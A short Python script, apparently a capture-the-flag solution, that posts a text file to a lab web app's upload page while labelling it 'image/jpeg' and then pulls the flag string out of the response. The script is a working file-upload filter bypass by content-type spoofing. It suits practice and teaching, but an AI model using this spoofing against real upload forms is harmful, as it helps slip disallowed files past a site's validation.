import requests

url = 'http://10.11.100.110/?page=upload'

f = { 
        'uploaded': ("test.txt", open('test.txt', 'rb'), 'image/jpeg')
        }

d = {
        'Upload': 'Upload'
        }

r = requests.post(url, files=f, data=d)
result = r.text
start = result.find("flag")
result = result[start:]
end = result.find("<")
result = result[:end]
print(result)
